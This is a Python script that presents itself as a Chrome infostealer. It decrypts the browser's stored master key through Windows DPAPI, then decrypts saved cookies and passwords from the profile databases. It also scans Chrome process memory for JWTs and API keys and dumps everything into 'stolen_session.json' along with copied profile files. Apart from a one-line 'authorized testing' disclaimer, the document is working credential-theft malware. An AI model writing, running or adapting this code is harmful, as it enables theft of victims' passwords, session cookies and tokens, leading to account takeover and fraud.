#!/usr/bin/env python3
"""
Comprehensive Browser Infostealer
Extracts: Cookies, LocalStorage, Passwords, Tokens, Full Profile
For use in authorized security testing only.
"""

import os
import json
import sqlite3
import shutil
import tempfile
from datetime import datetime
from pathlib import Path
import re

# Windows crypto
import ctypes
from ctypes import windll, byref, wintypes

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(wintypes.BYTE))]

def dpapi_decrypt(data):
    """Decrypt data using Windows DPAPI."""
    try:
        input_blob = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(wintypes.BYTE)))
        output_blob = DATA_BLOB()
        windll.crypt32.CryptUnprotectData(byref(input_blob), None, None, None, None, 0, byref(output_blob))
        return bytes(output_blob.pbData[:output_blob.cbData])
    except:
        return None


class ChromeInfstealer:
    def __init__(self):
        self.chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data")
        self.session_data = {
            "metadata": {
                "timestamp": datetime.now().isoformat(),
                "hostname": os.environ.get("COMPUTERNAME"),
                "username": os.environ.get("USERNAME"),
            },
            "cookies": [],
            "passwords": [],
            "autofill": [],
            "extensions": [],
            "localStorage": {},
            "sessionStorage": {},
            "tokens": [],
            "profile_path": self.chrome_path,
        }

    def extract_cookies(self):
        """Extract cookies from Chrome database."""
        print("[*] Extracting cookies...")

        try:
            local_state = os.path.join(self.chrome_path, "Local State")
            with open(local_state) as f:
                state = json.load(f)
                encrypted_key = __import__("base64").b64decode(state["os_crypt"]["encrypted_key"])[5:]

            master_key = dpapi_decrypt(encrypted_key)
            if not master_key:
                print("    [-] Could not decrypt master key")
                return

            # Get cookies from all profiles
            for profile in ["Default"]:  # Just Default profile
                profile_dir = os.path.join(self.chrome_path, profile)
                if not os.path.isdir(profile_dir):
                    continue

                cookies_db = os.path.join(profile_dir, "Network", "Cookies")
                if not os.path.exists(cookies_db):
                    continue

                # Copy database with retries
                tmp_db = os.path.join(tempfile.gettempdir(), f"cookies_{profile}_{os.getpid()}.db")
                for retry in range(3):
                    try:
                        shutil.copy(cookies_db, tmp_db)
                        conn = sqlite3.connect(tmp_db)
                        cursor = conn.cursor()

                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                        for host, name, encrypted_value in cursor.fetchall():
                            try:
                                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                                nonce = encrypted_value[3:15]
                                cipher = encrypted_value[15:]
                                value = AESGCM(master_key).decrypt(nonce, cipher, None).decode('utf-8', errors='ignore')

                                self.session_data["cookies"].append({
                                    "profile": profile,
                                    "domain": host,
                                    "name": name,
                                    "value": value,
                                })
                            except:
                                pass

                        conn.close()
                        break
                    except Exception as e:
                        if retry < 2:
                            import time
                            time.sleep(1)
                        else:
                            print(f"    [-] Cookie extraction error: {e}")
                    finally:
                        if os.path.exists(tmp_db):
                            try:
                                os.remove(tmp_db)
                            except:
                                pass

        except Exception as e:
            print(f"    [-] Error: {e}")

        print(f"    [+] Extracted {len(self.session_data['cookies'])} cookies")

    def extract_passwords(self):
        """Extract saved passwords from Chrome."""
        print("[*] Extracting saved passwords...")

        try:
            # Get master key
            local_state = os.path.join(self.chrome_path, "Local State")
            with open(local_state) as f:
                state = json.load(f)
                encrypted_key = __import__("base64").b64decode(state["os_crypt"]["encrypted_key"])[5:]

            master_key = dpapi_decrypt(encrypted_key)
            if not master_key:
                return

            # Extract from Login Data database
            for profile in os.listdir(self.chrome_path):
                profile_dir = os.path.join(self.chrome_path, profile)
                login_db = os.path.join(profile_dir, "Login Data")

                if not os.path.exists(login_db):
                    continue

                tmp_db = os.path.join(tempfile.gettempdir(), f"login_{profile}_{os.getpid()}.db")
                try:
                    shutil.copy(login_db, tmp_db)
                    conn = sqlite3.connect(tmp_db)
                    cursor = conn.cursor()

                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, username, encrypted_password in cursor.fetchall():
                        try:
                            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                            if encrypted_password.startswith(b'v10'):
                                nonce = encrypted_password[3:15]
                                cipher = encrypted_password[15:]
                                password = AESGCM(master_key).decrypt(nonce, cipher, None).decode()
                            else:
                                password = dpapi_decrypt(encrypted_password).decode('utf-8', errors='ignore')

                            self.session_data["passwords"].append({
                                "url": url,
                                "username": username,
                                "password": password,
                                "profile": profile,
                            })
                        except:
                            pass

                    conn.close()
                finally:
                    if os.path.exists(tmp_db):
                        os.remove(tmp_db)

        except Exception as e:
            print(f"    [-] Password extraction error: {e}")

        print(f"    [+] Extracted {len(self.session_data['passwords'])} passwords")

    def extract_tokens_from_memory(self):
        """Search Chrome memory for JWT tokens, API keys, and auth tokens."""
        print("[*] Scanning memory for tokens...")

        import psutil

        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}')
        api_key_patterns = [
            re.compile(r'sk-[A-Za-z0-9]{20,}'),  # OpenAI, Anthropic
            re.compile(r'ghp_[A-Za-z0-9]{36,}'),  # GitHub
            re.compile(r'Bearer [A-Za-z0-9_-]{20,}'),  # Bearer tokens
            re.compile(r'ya29\.[A-Za-z0-9_-]{20,}'),  # Google
        ]

        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if 'chrome' not in proc.name().lower():
                    continue

                try:
                    with open(f"/proc/{proc.pid}/maps") as maps:
                        for line in maps:
                            if 'rw' in line:
                                try:
                                    addr = int(line.split('-')[0], 16)
                                    with open(f"/proc/{proc.pid}/mem", 'rb') as mem:
                                        mem.seek(addr)
                                        data = mem.read(65536)

                                        # Search for JWTs
                                        for match in jwt_pattern.finditer(data.decode('utf-8', errors='ignore')):
                                            self.session_data["tokens"].append({
                                                "type": "JWT",
                                                "value": match.group(),
                                            })

                                        # Search for API keys
                                        for pattern in api_key_patterns:
                                            for match in pattern.finditer(data.decode('utf-8', errors='ignore')):
                                                self.session_data["tokens"].append({
                                                    "type": pattern.pattern.split('|')[0],
                                                    "value": match.group(),
                                                })
                                except:
                                    pass
                except:
                    pass
        except:
            print("    [-] Linux memory reading not available (requires /proc)")

        print(f"    [+] Found {len(self.session_data['tokens'])} tokens in memory")

    def copy_profile(self, output_dir):
        """Copy entire Chrome profile for offline analysis."""
        print("[*] Copying Chrome profile...")

        try:
            # Copy just the essential directories
            for item in ["Default", "Profile 1", "Guest Profile"]:
                src = os.path.join(self.chrome_path, item)
                dst = os.path.join(output_dir, item)

                if os.path.exists(src):
                    # Only copy databases and configs, not cache
                    for root, dirs, files in os.walk(src):
                        dirs[:] = [d for d in dirs if d != "Cache" and d != "Code Cache"]

                        for file in files:
                            if file.endswith((".db", ".json", ".txt", ".pref")):
                                src_file = os.path.join(root, file)
                                rel_path = os.path.relpath(src_file, src)
                                dst_file = os.path.join(dst, rel_path)

                                os.makedirs(os.path.dirname(dst_file), exist_ok=True)
                                shutil.copy2(src_file, dst_file)

            print(f"    [+] Profile copied to: {output_dir}")
        except Exception as e:
            print(f"    [-] Profile copy error: {e}")

    def export(self, output_file="stolen_session.json", profile_export=None):
        """Export all stolen data."""
        print(f"\n[+] Exporting stolen data to: {output_file}")

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(self.session_data, f, indent=2, default=str)

        print(f"    [+] Cookies: {len(self.session_data['cookies'])}")
        print(f"    [+] Passwords: {len(self.session_data['passwords'])}")
        print(f"    [+] Tokens: {len(self.session_data['tokens'])}")

        if profile_export:
            self.copy_profile(profile_export)

        return output_file


if __name__ == "__main__":
    print("="*70)
    print("Chrome Infostealer - Comprehensive Session Extraction")
    print("="*70)
    print()

    stealer = ChromeInfstealer()
    stealer.extract_cookies()
    stealer.extract_passwords()
    stealer.extract_tokens_from_memory()

    output_file = stealer.export("stolen_session.json", "stolen_profile")

    print()
    print("="*70)
    print(f"[+] Extraction complete: {output_file}")
    print("="*70)
